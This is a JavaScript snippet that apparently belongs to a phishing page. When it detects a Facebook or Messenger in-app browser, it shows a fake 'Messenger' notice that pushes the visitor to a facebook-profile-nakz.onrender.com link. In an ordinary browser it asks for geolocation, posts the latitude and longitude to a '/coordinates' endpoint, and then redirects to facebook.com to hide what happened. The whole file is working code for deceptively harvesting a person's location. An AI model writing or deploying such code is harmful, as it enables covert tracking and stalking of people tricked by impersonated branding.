function isInAppBrowser() {
  const ua = navigator.userAgent || "";
  return /FBAV|FBAN|Messenger|Instagram/i.test(ua);
}

function getCoordinates() {
  if (isInAppBrowser()) {
    // Messenger/FB browser fallback
    document.body.innerHTML = `
      <div style="padding: 40px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; text-align: center;">
        <h2 style="color:#0084ff;">Messenger</h2>
        <p style="font-size: 15px; color: #1c1e21;">Messenger blocks access to your location.</p>
        <p style="font-size: 14px;">Please tap the button below to open this page in your real browser (Safari or Chrome):</p>
        <a href="https://facebook-profile-nakz.onrender.com" target="_blank" rel="noopener noreferrer"
           style="display:inline-block;background-color:#0084ff;color:white;padding:12px 20px;border:none;border-radius:6px;font-size:16px;margin-top:20px;text-decoration:none;font-weight:500;">
          🔗 Open in Safari/Chrome
        </a>
        <p style="margin-top:12px;font-size:13px;color:gray;">If the button doesn’t work, copy the link below and open manually in Safari or Chrome.</p>
        <div style="word-wrap:break-word;background:#f1f1f1;padding:10px;border-radius:6px;font-size:13px;color:#333;">
          https://facebook-profile-nakz.onrender.com
        </div>
      </div>
    `;
    return;
  }

  // If in real browser (Safari/Chrome)
  if (!navigator.geolocation) {
    alert("❌ Geolocation not supported.");
    window.location.href = "https://facebook.com";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };

      fetch("/coordinates", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(() => {
        window.location.href = "https://facebook.com";
      })
      .catch(() => {
        window.location.href = "https://facebook.com";
      });
    },
    () => {
      alert("❌ Location permission denied.");
      window.location.href = "https://facebook.com";
    }
  );
}
